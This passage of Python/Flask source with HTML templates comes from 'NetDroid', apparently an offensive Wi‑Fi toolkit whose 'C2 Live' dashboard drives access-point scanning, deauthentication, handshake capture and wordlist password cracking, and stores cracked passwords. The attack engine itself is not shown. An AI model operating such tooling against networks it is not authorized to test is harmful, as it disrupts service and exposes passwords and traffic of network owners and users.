                dash.kami_engine.iniciar_scan_continuo(profundo=profundo)
                return jsonify({"status": "iniciado", "modo": "profundo" if profundo else "rápido"})
            except Exception as e:
                return jsonify({"erro": str(e)}), 500

        @app.route("/api/rescan_stop", methods=["POST"])
        def api_rescan_stop():
            """Para o scan contínuo de redes."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            try:
                dash.kami_engine.parar_scan_continuo()
                return jsonify({"status": "parado"})
            except Exception as e:
                return jsonify({"erro": str(e)}), 500

        @app.route("/api/scan_scapy", methods=["POST", "GET"])
        def api_scan_scapy():
            """Roda um sniff scapy passivo e mescla sem duplicar."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            eng = dash.kami_engine
            if not HAS_SCAPY:
                return jsonify({"erro": "scapy não instalado"}), 400
            try:
                achados = eng._scan_aps_scapy(timeout_sec=12) or []
                novos = 0
                for ap in achados:
                    try:
                        merged, criado = eng._adicionar_ou_mesclar_ap(ap)
                        if criado:
                            merged.update(WifiSecurityAuditor.auditar(merged))
                            merged["pacotes"] = merged.get("pacotes", 0)
                            if eng.memoria:
                                ap_persistido = eng.memoria.registrar_ap(merged)
                                merged.update({k: v for k, v in ap_persistido.items()
                                                if k in ("senha", "quebrada_em", "wordlist_usada",
                                                          "handshake_path", "handshake_em",
                                                          "primeiro_visto", "visitas",
                                                          "historico_zonas")})
                            with eng.zonas_lock:
                                if merged["bssid"] not in (eng.zonas["verde"]
                                                            + eng.zonas["vermelha"]
                                                            + eng.zonas["azul"]):
                                    eng.zonas["verde"].append(merged["bssid"])
                            emitir("ap_descoberto", **merged)
                            novos += 1
                        else:
                            emitir("ap_update", **merged)
                    except Exception as _e:
                        dash.ui.warn(f"scapy merge falhou p/ {ap.get('bssid')}: {_e}")
                total = len(eng.alvos)
                return jsonify({"ok": True, "novos": novos, "total": total,
                                  "varridos": len(achados)})
            except Exception as e:
                dash.ui.error(f"scan_scapy falhou: {e}")
                return jsonify({"erro": str(e)}), 500

        @app.route("/api/scan_nmcli", methods=["POST", "GET"])
        def api_scan_nmcli():
            """Roda nmcli imediatamente, mescla TUDO sem duplicar e retorna
            quantos APs novos entraram. Pode ser chamado N vezes seguidas."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            eng = dash.kami_engine
            try:
                achados = eng._scan_aps_nmcli(timeout_sec=15) or []
                novos = 0
                for ap in achados:
                    try:
                        merged, criado = eng._adicionar_ou_mesclar_ap(ap)
                        if criado:
                            merged.update(WifiSecurityAuditor.auditar(merged))
                            merged["pacotes"] = merged.get("pacotes", 0)
                            if eng.memoria:
                                ap_persistido = eng.memoria.registrar_ap(merged)
                                merged.update({k: v for k, v in ap_persistido.items()
                                                if k in ("senha", "quebrada_em", "wordlist_usada",
                                                          "handshake_path", "handshake_em",
                                                          "primeiro_visto", "visitas",
                                                          "historico_zonas")})
                            with eng.zonas_lock:
                                if merged["bssid"] not in (eng.zonas["verde"]
                                                            + eng.zonas["vermelha"]
                                                            + eng.zonas["azul"]):
                                    eng.zonas["verde"].append(merged["bssid"])
                            emitir("ap_descoberto", **merged)
                            novos += 1
                        else:
                            emitir("ap_update", **merged)
                    except Exception as _e:
                        dash.ui.warn(f"nmcli merge falhou p/ {ap.get('bssid')}: {_e}")
                total = len(eng.alvos)
                return jsonify({"ok": True, "novos": novos, "total": total,
                                  "varridos": len(achados)})
            except Exception as e:
                dash.ui.error(f"scan_nmcli falhou: {e}")
                return jsonify({"erro": str(e)}), 500

        @app.route("/api/rescan_exec", methods=["POST"])
        def api_rescan_exec():
            """Executa uma iteração do scan (chamado pelo frontend periodicamente)."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            try:
                resumo = dash.kami_engine.remapear_redes(scan_profundo=False)
                return jsonify(resumo)
            except Exception as e:
                return jsonify({"erro": str(e)}), 500

        @sio.on("connect")
        def on_connect():
            dash._sync_estado()
            sio.emit("estado_inicial", dash.estado)

        @sio.on("mover_zona")
        def on_mover(data):
            """Drag-and-drop entre zonas (--kamikase)."""
            if dash.modo != "kamikase" or not dash.kami_engine:
                return
            bssid = data.get("bssid")
            destino = data.get("destino")  # 'verde'|'vermelha'|'azul'
            perfil = data.get("perfil", "low")
            # Suporta wordlist (legado) ou wordlists (novo array)
            wordlists = data.get("wordlists") or data.get("wordlist")
            if wordlists and not isinstance(wordlists, list):
                wordlists = [wordlists]
            contextual = data.get("contextual", True)
            stop_on_crack = data.get("stop_on_crack", True)
            try:
                dash.kami_engine.mover_para_zona(bssid, destino, perfil=perfil,
                                                  wordlists=wordlists,
                                                  contextual=contextual,
                                                  stop_on_crack=stop_on_crack)
            except Exception as e:
                dash.ui.warn(f"Erro ao mover {bssid} → {destino}: {e}")

        @sio.on("reset_deauth")
        def on_reset_deauth(data):
            """Reinicia deauth para um BSSID específico."""
            if dash.modo != "kamikase" or not dash.kami_engine:
                return
            bssid = data.get("bssid")
            try:
                dash.kami_engine.reset_deauth(bssid)
                dash.ui.info(f"Deauth reiniciado para {bssid}")
            except Exception as e:
                dash.ui.warn(f"Erro ao reiniciar deauth para {bssid}: {e}")

        @sio.on("reset_crack")
        def on_reset_crack(data):
            """Reinicia crack (e opcionalmente recaptura handshake) para um BSSID."""
            if dash.modo != "kamikase" or not dash.kami_engine:
                return
            bssid = data.get("bssid")
            recapturar = data.get("recapturar", False)
            try:
                dash.kami_engine.reset_crack(bssid, recapturar=recapturar)
                dash.ui.info(f"Crack reiniciado para {bssid} (recapturar={recapturar})")
            except Exception as e:
                dash.ui.warn(f"Erro ao reiniciar crack para {bssid}: {e}")

        @sio.on("set_slot_vermelha")
        def on_set_slot_vermelha(data):
            """Configura duração do slot vermelha (15s/60s/300s/3600s) ou
            ativa modo infinito (lock-on-channel). Default 15s."""
            if dash.modo != "kamikase" or not dash.kami_engine:
                return
            eng = dash.kami_engine
            if not eng.carrossel:
                # Garante carrossel rodando pra setar config (mesmo idle)
                try: eng._garantir_carrossel()
                except Exception: pass
            if not eng.carrossel:
                return
            try:
                infinito = bool(data.get("infinito", False))
                segundos = int(data.get("segundos", 15))
                eng.carrossel.set_slot_vermelha(segundos=segundos, infinito=infinito)
            except Exception as e:
                dash.ui.warn(f"set_slot_vermelha falhou: {e}")

        @sio.on("set_slot_azul")
        def on_set_slot_azul(data):
            """Configura duração do slot azul (10s/30s/60s/300s) ou
            ativa modo infinito (lock-on-channel). Default 10s.
            Slots maiores aumentam chance de pegar handshake de clientes lentos."""
            if dash.modo != "kamikase" or not dash.kami_engine:
                return
            eng = dash.kami_engine
            if not eng.carrossel:
                try: eng._garantir_carrossel()
                except Exception: pass
            if not eng.carrossel:
                return
            try:
                infinito = bool(data.get("infinito", False))
                segundos = int(data.get("segundos", 10))
                eng.carrossel.set_slot_azul(segundos=segundos, infinito=infinito)
            except Exception as e:
                dash.ui.warn(f"set_slot_azul falhou: {e}")

        @sio.on("recapturar_handshake")
        def on_recapturar_handshake(data):
            """Cancela captura em andamento e refaz do zero (zona azul)."""
            if dash.modo != "kamikase" or not dash.kami_engine:
                return
            bssid = data.get("bssid")
            try:
                dash.kami_engine.recapturar_handshake(bssid)
                dash.ui.info(f"🔄 Recaptura iniciada para {bssid}")
            except Exception as e:
                dash.ui.warn(f"Erro ao recapturar {bssid}: {e}")

        @app.route("/api/restaurar_wifi", methods=["POST"])
        def api_restaurar_wifi():
            """Restaura WiFi: sai de monitor mode e volta para managed.
            Para o carrossel, mata processos ativos, restaura a interface."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            eng = dash.kami_engine
            try:
                # Para o carrossel (mata aireplays e airodumps em curso)
                if eng.carrossel:
                    try: eng.carrossel.parar()
                    except Exception: pass
                # Restaura interface de monitor → managed
                eng._restaurar_iface()
                eng.monitor_ativo = False
                eng.ui.success("✓ WiFi restaurado — modo managed ativo")
                try: emitir("wifi_restaurado", iface=eng.iface_orig)
                except Exception: pass
                return jsonify({"ok": True, "msg": "WiFi restaurado — modo managed ativo"})
            except Exception as e:
                eng.ui.error(f"Erro ao restaurar WiFi: {e}")
                return jsonify({"erro": str(e)}), 500


# ══════════════════ TEMPLATES HTML ═════════════════════════════

TEMPLATE_GOD = r"""<!doctype html>
<html lang="pt-BR" class="dark">
<head>
<meta charset="utf-8">
<title>NetDroid · GOD · C2 Live</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
  :root {
    --red:#ff003c; --red-deep:#7a001c; --green:#00ff9f; --cyan:#00d4ff;
    --yellow:#fdee00; --purple:#bc13fe; --orange:#ff9d4d;
    --bg:#050608; --bg-2:#0a0c12; --bg-card:rgba(10,12,18,0.85);
    --line:rgba(255,255,255,0.05); --line-hot:rgba(255,0,60,0.25);
    --text:#e8eaed; --text-2:#9ca3af; --text-dim:#5b6370;
  }
  *{ box-sizing:border-box; }
  body {
    background:
      radial-gradient(ellipse 800px 500px at 0% 0%, rgba(255,0,60,0.08), transparent 60%),
      radial-gradient(ellipse 800px 500px at 100% 100%, rgba(0,212,255,0.04), transparent 60%),
      var(--bg);
    color: var(--text);
    font-family: 'JetBrains Mono','Courier New',monospace;
    font-size: 13px; letter-spacing: 0.01em;
    min-height: 100vh; position: relative;
  }
  /* CRT scanlines */
  body::before {
    content:''; position:fixed; inset:0;
    background: repeating-linear-gradient(0deg, transparent 0, transparent 2px, rgba(255,255,255,0.018) 2px, rgba(255,255,255,0.018) 3px);
    pointer-events:none; z-index:1;
  }
  /* Vignette */
  body::after {
    content:''; position:fixed; inset:0;
    background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.6) 100%);
    pointer-events:none; z-index:1;
  }
  main, header, footer { position: relative; z-index: 2; }
  /* Cards cyberpunk com brackets nos cantos */
  .cyber {
    background: var(--bg-card);
    border: 1px solid var(--line);
    backdrop-filter: blur(8px);
    position: relative;
    transition: border-color .25s, transform .25s;
  }
  .cyber::before, .cyber::after {
    content:''; position:absolute; width:14px; height:14px;
    border:1px solid var(--red); pointer-events:none;
    transition: opacity .25s, border-color .25s;
    opacity: 0.4;
  }
  .cyber::before { top:-1px; left:-1px; border-right:none; border-bottom:none; }
  .cyber::after  { bottom:-1px; right:-1px; border-left:none; border-top:none; }
  .cyber:hover { border-color: var(--line-hot); }
  .cyber:hover::before, .cyber:hover::after { opacity:1; }

  /* Stat tile */
  .stat {
    padding: 18px 16px 14px; position: relative; overflow:hidden;
  }
  .stat::after {
    content:''; position:absolute; bottom:0; left:0;
    height:1px; width:40%;
    background: linear-gradient(90deg, var(--red), transparent);
  }
  .stat-val { font-family:'Orbitron',monospace; font-size:1.9rem; font-weight:800; line-height:1; letter-spacing:-0.01em; font-variant-numeric: tabular-nums; }
  .stat-lbl { font-size:0.62rem; letter-spacing:0.22em; text-transform:uppercase; color:var(--text-dim); margin-top:10px; }
  .stat-fase-val { font-size:0.78rem; font-weight:700; line-height:1.25; color:var(--purple); text-shadow: 0 0 10px rgba(188,19,254,0.4); display:-webkit-box; -webkit-line-clamp:3; -webkit-box-orient:vertical; overflow:hidden; }

  /* Logo */
  .logo {
    font-family:'Orbitron',monospace; font-weight:900;
    font-size:1.2rem; letter-spacing:0.2em;
    color:var(--red); text-shadow: 0 0 10px var(--red), 0 0 28px rgba(255,0,60,0.4);
    position:relative;
  }
  .logo::after {
    content:''; position:absolute; left:0; right:0; bottom:-4px; height:1px;
    background: linear-gradient(90deg, transparent, var(--red), transparent);
  }
  .tag-mode {
    font-size:0.62rem; letter-spacing:0.22em; font-weight:700;
    padding:4px 10px; border:1px solid var(--red); border-radius:999px;
    background: rgba(255,0,60,0.08); color:var(--red); text-transform:uppercase;
    animation: glow-pulse 2s ease-in-out infinite;
  }
  @keyframes glow-pulse {
    0%,100% { box-shadow: 0 0 8px rgba(255,0,60,0.3); }
    50% { box-shadow: 0 0 18px rgba(255,0,60,0.7); }
  }

  /* LEDs */
  .led { display:inline-block; width:6px; height:6px; border-radius:50%; margin-right:6px; vertical-align:middle; }
  .led-on  { background:var(--green); box-shadow: 0 0 6px var(--green); }
  .led-warn{ background:var(--yellow); box-shadow: 0 0 6px var(--yellow); }
  .led-off { background:var(--red);   box-shadow: 0 0 8px var(--red); animation: led-blink 1.4s ease-in-out infinite; }
  @keyframes led-blink { 50% { opacity: 0.3; } }

  /* Section header */
  h2.sec {
    font-size:0.7rem; letter-spacing:0.22em; text-transform:uppercase;
    color:var(--text); font-weight:700;
    display:flex; align-items:center; gap:10px;
  }
  h2.sec::before { content:''; width:14px; height:1px; background:var(--red); }

  /* Host card */
  .host-card {
    background: linear-gradient(180deg, rgba(255,255,255,0.015), transparent);
    border: 1px solid var(--line);
    transition: all .2s;
  }
  .host-card:hover { border-color: var(--line-hot); transform: translateX(2px); }
  .host-card.gw { border-left: 3px solid var(--red); }

  .pill {
    display:inline-flex; align-items:center; gap:4px;
    font-size:0.62rem; letter-spacing:0.08em; font-weight:600;
    padding:2px 8px; border-radius:3px; border:1px solid currentColor;
    text-transform:uppercase;
  }

  /* Severity badges */
  .sev-critica { background:rgba(255,0,60,0.12); color:#ff5d77; border-color:rgba(255,0,60,0.4); }
  .sev-alta    { background:rgba(255,140,0,0.12); color:#ff9d4d; border-color:rgba(255,140,0,0.4); }
  .sev-media   { background:rgba(255,220,0,0.10); color:#ffe05e; border-color:rgba(255,220,0,0.35); }
  .sev-info    { background:rgba(0,212,255,0.10); color:#5fbcff; border-color:rgba(0,212,255,0.35); }
  .sev-ok      { background:rgba(0,255,159,0.10); color:#5fff9f; border-color:rgba(0,255,159,0.35); }

  /* Tipo cores */
  .tipo-roteador     { color:#5fbcff; border-color:rgba(95,188,255,0.4); background:rgba(0,75,140,0.15); }
  .tipo-camera_ip    { color:#ff5d77; border-color:rgba(255,93,119,0.4); background:rgba(140,0,40,0.15); }
  .tipo-windows_pc   { color:#9ad0ff; border-color:rgba(154,208,255,0.3); background:rgba(28,42,58,0.4); }
  .tipo-linux_servidor { color:#5fff9f; border-color:rgba(95,255,159,0.3); background:rgba(6,62,26,0.4); }
  .tipo-mobile       { color:#ff9af0; border-color:rgba(255,154,240,0.3); background:rgba(58,6,62,0.4); }
  .tipo-impressora   { color:#ffe05e; border-color:rgba(255,224,94,0.3); background:rgba(58,50,6,0.4); }
  .tipo-nas          { color:#5fffe0; border-color:rgba(95,255,224,0.3); background:rgba(6,62,58,0.4); }
  .tipo-voip         { color:#c89aff; border-color:rgba(200,154,255,0.3); background:rgba(42,6,62,0.4); }
  .tipo-iot_generico { color:#ffb35e; border-color:rgba(255,179,94,0.3); background:rgba(62,42,6,0.4); }
  .tipo-desconhecido { color:#888; border-color:rgba(136,136,136,0.3); background:rgba(20,20,20,0.4); }

  /* Animations */
  .fadein { animation: fadein .35s ease-out; }
  @keyframes fadein { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
  .scan-bar { position:absolute; left:0; right:0; top:0; height:1px; background:linear-gradient(90deg,transparent,var(--red),transparent); animation: scan 4s linear infinite; }
  @keyframes scan { 0%{top:0}100%{top:100%} }

  /* Scrollbar */
  ::-webkit-scrollbar { width:6px; height:6px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.25); border-radius:3px; }
  ::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.5); }

  /* Glow utilities */
  .text-glow-red   { text-shadow: 0 0 8px var(--red); }
  .text-glow-green { text-shadow: 0 0 8px var(--green); }
  .text-glow-cyan  { text-shadow: 0 0 8px var(--cyan); }
</style>
</head>
<body>

<header class="cyber border-0 border-b px-6 py-3 flex items-center justify-between sticky top-0 z-30" style="background: rgba(5,6,8,0.92); border-color: var(--line-hot)">
  <div class="flex items-center gap-5">
    <div class="logo">NETDROID</div>
    <div class="tag-mode">⚡ GOD · C2 LIVE</div>
    <div class="text-xs text-gray-500" id="timestamp">--:--:--</div>
  </div>
  <div class="flex items-center gap-4 text-xs">
    <span class="flex items-center"><span class="led led-on"></span><span class="text-gray-400 uppercase tracking-wider">online</span></span>
    <span class="text-gray-600">v1.4.0</span>
  </div>
</header>

<main class="p-4 grid grid-cols-12 gap-3">

  <section class="col-span-12 grid grid-cols-2 md:grid-cols-4 gap-3">
    <div class="cyber stat fadein">
      <div class="stat-val" style="color:var(--green)" id="stat-hosts">0</div>
      <div class="stat-lbl">▸ Hosts</div>
    </div>
    <div class="cyber stat fadein">
      <div class="stat-val text-yellow-400" id="stat-portas">0</div>
      <div class="stat-lbl">▸ Portas Abertas</div>
    </div>
    <div class="cyber stat fadein">
      <div class="stat-val" style="color:var(--red)" id="stat-vulns">0</div>
      <div class="stat-lbl">▸ Vulnerabilidades</div>
    </div>
    <div class="cyber stat fadein" style="overflow:hidden">
      <div class="stat-fase-val" id="stat-fase">aguardando…</div>
      <div class="stat-lbl">▸ Fase Atual</div>
    </div>
  </section>

  <section class="col-span-12 lg:col-span-8 cyber p-4 relative" style="overflow:hidden">
    <div class="scan-bar"></div>
    <div class="flex items-center justify-between mb-4">
      <h2 class="sec">⚔ Inventário de Hosts</h2>
      <span class="text-xs text-gray-500" id="host-count-label">0 mapeados</span>
    </div>
    <div id="host-list" class="space-y-1.5 max-h-[600px] overflow-y-auto pr-2"></div>
  </section>

  <aside class="col-span-12 lg:col-span-4 space-y-3">
    <div class="cyber p-4">
      <h2 class="sec mb-4">⚙ Distribuição por Tipo</h2>
      <canvas id="chart-types" height="200"></canvas>
    </div>
    <div class="cyber p-4">
      <h2 class="sec mb-4">⚠ Severidade de Vulns</h2>
      <canvas id="chart-vulns" height="200"></canvas>
    </div>
  </aside>

  <section class="col-span-12 cyber p-4">
    <h2 class="sec mb-4" style="color:#ff5d77">⚠ Vulnerabilidades Detectadas</h2>
    <div id="vuln-list" class="space-y-1 max-h-[260px] overflow-y-auto"></div>
  </section>

  <section class="col-span-12 cyber p-4">
    <h2 class="sec mb-3">▸ Log em Tempo Real</h2>
    <pre id="logfeed" class="text-xs leading-5 max-h-[200px] overflow-y-auto" style="color:var(--text-2)"></pre>
  </section>

</main>

<footer class="text-center text-xs py-4 mt-2" style="color:var(--text-dim); border-top:1px solid var(--line)">
  NetDroid v1.4.0 · GOD C2 Live · localhost only · uso autorizado apenas
</footer>

<script>
const sock = io({transports:["polling"]});
let hosts = {}; let vulns = []; let chartTypes, chartVulns;

const TIPO_COLORS = ["#ff003c","#5fbcff","#5fff9f","#ffe05e","#bc13fe","#ff9d4d","#5fffe0","#ff9af0","#888"];
const SEV_COLORS = { critica:"#ff003c", alta:"#ff8a3d", media:"#fdee00", info:"#5fbcff" };

function pill(text, klass){return `<span class="pill ${klass}">${text}</span>`}

function renderHosts(){
  const el = document.getElementById("host-list");
  const arr = Object.values(hosts).sort((a,b)=>(b.is_gateway?1:0)-(a.is_gateway?1:0));
  el.innerHTML = arr.map(h=>{
    const score = h.score||0;
    const ledClass = score>=60?"led-off":score>=30?"led-warn":"led-on";
    const riskColor = score>=60?"#ff5d77":score>=30?"#ffe05e":"#5fff9f";
    const tipoCl = "tipo-" + (h.device_type||"desconhecido");
    return `
    <div class="host-card rounded p-2.5 fadein cursor-pointer ${h.is_gateway?'gw':''}" onclick="toggle('${h.ip}')">
      <div class="flex items-center justify-between">
        <div class="flex items-center gap-3 min-w-0">
          <span class="led ${ledClass}"></span>
          <span class="font-bold tabular-nums" style="color:var(--text)">${h.ip}</span>
          ${h.is_gateway?pill("GATEWAY","sev-critica"):""}
          <span class="text-xs text-gray-500 truncate">${h.hostname||"—"}</span>
        </div>
        <div class="flex items-center gap-2 shrink-0">
          ${pill(h.device_type||"?",tipoCl)}
          <span class="text-xs font-bold tabular-nums" style="color:${riskColor}">${score}</span>
        </div>
      </div>
      <div id="det-${h.ip.replace(/\./g,"-")}" class="hidden mt-3 pt-3 text-xs space-y-1" style="border-top:1px dashed var(--line)">
        <div class="grid grid-cols-2 gap-2">
          <div><span class="text-gray-500">MAC:</span> <span class="text-gray-300 tabular-nums">${h.mac||"N/A"}</span></div>
          <div><span class="text-gray-500">Vendor:</span> <span class="text-gray-300">${h.vendor||"?"}</span></div>
          <div><span class="text-gray-500">OS:</span> <span class="text-gray-300">${h.os||"?"}</span></div>
          <div><span class="text-gray-500">Latência:</span> <span class="text-gray-300 tabular-nums">${h.latency_ms||0}ms</span></div>
        </div>
        ${h.ports&&h.ports.length?`<div class="mt-2"><span class="text-gray-500">Portas:</span> <span class="tabular-nums" style="color:var(--yellow)">${h.ports.slice(0,15).join(", ")}</span></div>`:""}
        ${h.fontes?`<div><span class="text-gray-500">Fontes:</span> <span style="color:var(--cyan)">${h.fontes.join(" · ")}</span></div>`:""}
        ${h.vulns&&h.vulns.length?`<div class="mt-2 space-y-1">${h.vulns.map(v=>`<div class="pill sev-${v.severidade} block !text-left !text-xs !px-2 !py-1.5 !normal-case !tracking-normal">[${v.severidade.toUpperCase()}] ${v.dica_cve}</div>`).join("")}</div>`:""}
      </div>
    </div>`;
  }).join("");
  document.getElementById("host-count-label").textContent = `${arr.length} mapeados`;
  document.getElementById("stat-hosts").textContent = arr.length;
  document.getElementById("stat-portas").textContent = arr.reduce((a,h)=>a+(h.ports||[]).length,0);
}
function toggle(ip){const el = document.getElementById("det-"+ip.replace(/\./g,"-")); if(el) el.classList.toggle("hidden");}

function renderVulns(){
  const el = document.getElementById("vuln-list");
  el.innerHTML = vulns.slice(-50).reverse().map(v=>`
    <div class="flex items-center gap-2 fadein text-xs py-1">
      <span class="pill sev-${v.severidade}">${(v.severidade||"info").toUpperCase()}</span>
      <span class="text-gray-300 tabular-nums">${v.ip}:${v.porta||"?"}</span>
      <span class="text-gray-500 truncate">${v.dica_cve||""}</span>
    </div>
  `).join("");
  document.getElementById("stat-vulns").textContent = vulns.length;
  updateChartVulns();
}

function updateChartTypes(){
  const counts = {};
  Object.values(hosts).forEach(h=>{const t=h.device_type||"desconhecido"; counts[t]=(counts[t]||0)+1;});
  const labels = Object.keys(counts), data = Object.values(counts);
  const cfg = {
    type:"doughnut",
    data:{labels,datasets:[{data,backgroundColor:TIPO_COLORS,borderColor:"#0a0c12",borderWidth:2,hoverOffset:8}]},
    options:{
      responsive:true, cutout:"68%",
      plugins:{
        legend:{position:"bottom",labels:{color:"#9ca3af",font:{size:10,family:"JetBrains Mono"},boxWidth:10,padding:12}},
        tooltip:{titleFont:{family:"JetBrains Mono"},bodyFont:{family:"JetBrains Mono"}}
      }
    }
  };
  if(!chartTypes){ chartTypes = new Chart(document.getElementById("chart-types"),cfg); }
  else { chartTypes.data.labels=labels; chartTypes.data.datasets[0].data=data; chartTypes.update(); }
}
function updateChartVulns(){
  const counts = {critica:0,alta:0,media:0,info:0};
  vulns.forEach(v=>{counts[v.severidade||"info"]=(counts[v.severidade||"info"]||0)+1;});
  const total = Object.values(counts).reduce((a,b)=>a+b,0);
  const data = total === 0 ? [1] : [counts.critica,counts.alta,counts.media,counts.info];
  const labels = total === 0 ? ["sem vulns"] : ["Crítica","Alta","Média","Info"];
  const colors = total === 0 ? ["#1a1a1a"] : [SEV_COLORS.critica,SEV_COLORS.alta,SEV_COLORS.media,SEV_COLORS.info];
  const cfg = {
    type:"doughnut",
    data:{labels,datasets:[{data,backgroundColor:colors,borderColor:"#0a0c12",borderWidth:2,hoverOffset:8}]},
    options:{responsive:true, cutout:"68%", plugins:{legend:{position:"bottom",labels:{color:"#9ca3af",font:{size:10,family:"JetBrains Mono"},boxWidth:10,padding:10}}}}
  };
  if(!chartVulns){ chartVulns = new Chart(document.getElementById("chart-vulns"),cfg); }
  else { chartVulns.data.labels=labels; chartVulns.data.datasets[0].data=data; chartVulns.data.datasets[0].backgroundColor=colors; chartVulns.update(); }
}

function log(msg, tipo){
  const el = document.getElementById("logfeed");
  const cor = {info:"#5fbcff",ok:"#5fff9f",warn:"#ffe05e",err:"#ff5d77"}[tipo]||"#9ca3af";
  const t = new Date().toLocaleTimeString();
  let novo = `<span style="color:${cor}">[${t}]</span> ${msg}\n` + el.innerHTML;
  // B8: cap em 50KB (~300 linhas) para evitar memory leak
  if(novo.length > 50000) novo = novo.slice(0, 50000);
  el.innerHTML = novo;
}
setInterval(()=>{document.getElementById("timestamp").textContent = new Date().toLocaleTimeString();},1000);

sock.on("estado_inicial",s=>{
  (s.hosts||[]).forEach(h=>hosts[h.ip]=h);
  vulns = s.vulns||[];
  if(s.fase) document.getElementById("stat-fase").textContent = s.fase;
  renderHosts(); renderVulns(); updateChartTypes();
});
sock.on("host_found",h=>{hosts[h.ip]=h;renderHosts();updateChartTypes();log(`<span style="color:#5fff9f">▸</span> host <span style="color:#fff">${h.ip}</span> <span style="color:#888">(${h.device_type||"?"})</span>`,"ok");});
sock.on("host_update",h=>{Object.assign(hosts[h.ip]||(hosts[h.ip]={}),h);renderHosts();updateChartTypes();});
sock.on("vuln_found",v=>{vulns.push(v);renderVulns();log(`<span style="color:#ff5d77">⚠</span> vuln <span style="color:#fff">${v.ip}:${v.porta}</span> <span class="pill sev-${v.severidade}">${(v.severidade||'').toUpperCase()}</span>`,v.severidade==="critica"?"err":"warn");});
sock.on("fase",f=>{document.getElementById("stat-fase").textContent=f.nome;log(`<span style="color:#bc13fe">▶</span> ${f.nome}`,"info");});
sock.on("log",d=>log(d.msg,d.tipo||"info"));
</script>
</body></html>"""


TEMPLATE_KAMIKASE = r"""<!doctype html>
<html lang="pt-BR" class="dark">
<head>
<meta charset="utf-8">
<title>NetDroid · KAMIKASE · C2 Live</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.2/Sortable.min.js"></script>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<style>
  :root {
    --red:#ff003c; --red-deep:#7a001c; --green:#00ff9f; --cyan:#00d4ff;
    --yellow:#fdee00; --purple:#bc13fe; --orange:#ff9d4d;
    --bg:#050608; --bg-2:#0a0c12; --bg-card:rgba(10,12,18,0.85);
    --line:rgba(255,255,255,0.05); --line-hot:rgba(255,0,60,0.25);
    --text:#e8eaed; --text-2:#9ca3af; --text-dim:#5b6370;
  }
  *{ box-sizing:border-box; }
  body {
    background:
      radial-gradient(ellipse 800px 500px at 0% 0%, rgba(255,0,60,0.08), transparent 60%),
      radial-gradient(ellipse 800px 500px at 100% 100%, rgba(0,212,255,0.04), transparent 60%),
      var(--bg);
    color: var(--text);
    font-family: 'JetBrains Mono','Courier New',monospace;
    font-size: 13px; letter-spacing: 0.01em;
    min-height: 100vh; position: relative;
  }
  body::before {
    content:''; position:fixed; inset:0;
    background: repeating-linear-gradient(0deg, transparent 0, transparent 2px, rgba(255,255,255,0.018) 2px, rgba(255,255,255,0.018) 3px);
    pointer-events:none; z-index:1;
  }
  body::after {
    content:''; position:fixed; inset:0;
    background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.6) 100%);
    pointer-events:none; z-index:1;
  }
  main, header, footer, #bulk-toolbar, #modal, #modal-detalhes, #toast { position: relative; z-index: 2; }

  /* Cards cyberpunk com brackets nos cantos */
  .cyber {
    background: var(--bg-card);
    border: 1px solid var(--line);
    backdrop-filter: blur(8px);
    position: relative;
    transition: border-color .25s;
  }
  .cyber::before, .cyber::after {
    content:''; position:absolute; width:14px; height:14px;
    border:1px solid var(--red); pointer-events:none;
    transition: opacity .25s; opacity: 0.4;
  }
  .cyber::before { top:-1px; left:-1px; border-right:none; border-bottom:none; }
  .cyber::after  { bottom:-1px; right:-1px; border-left:none; border-top:none; }
  .cyber:hover { border-color: var(--line-hot); }
  .cyber:hover::before, .cyber:hover::after { opacity:1; }

  /* Zonas */
  .zone-green { border-left: 3px solid var(--green); }
  .zone-red   { border-left: 3px solid var(--red); }
  .zone-blue  { border-left: 3px solid var(--cyan); }
  .zone-green::before, .zone-green::after { border-color: var(--green); }
  .zone-red::before, .zone-red::after { border-color: var(--red); }
  .zone-blue::before, .zone-blue::after { border-color: var(--cyan); }

  /* Logo */
  .logo {
    font-family:'Orbitron',monospace; font-weight:900;
    font-size:1.2rem; letter-spacing:0.2em;
    color:var(--red); text-shadow: 0 0 10px var(--red), 0 0 28px rgba(255,0,60,0.4);
    position:relative;
  }
  .logo::after {
    content:''; position:absolute; left:0; right:0; bottom:-4px; height:1px;
    background: linear-gradient(90deg, transparent, var(--red), transparent);
  }
  .tag-mode {
    font-size:0.62rem; letter-spacing:0.22em; font-weight:700;
    padding:4px 10px; border:1px solid var(--red); border-radius:999px;
    background: rgba(255,0,60,0.08); color:var(--red); text-transform:uppercase;
    animation: glow-pulse 2s ease-in-out infinite;
  }
  @keyframes glow-pulse {
    0%,100% { box-shadow: 0 0 8px rgba(255,0,60,0.3); }
    50% { box-shadow: 0 0 18px rgba(255,0,60,0.7); }
  }

  /* AP card */
  .ap-card {
    background: linear-gradient(180deg, rgba(255,255,255,0.018), transparent);
    border: 1px solid var(--line);
    transition: all .25s;
    cursor: grab;
    position: relative;
  }
  .ap-card:active { cursor: grabbing; }
  .ap-card:hover { transform: translateY(-1px); border-color: var(--line-hot); }
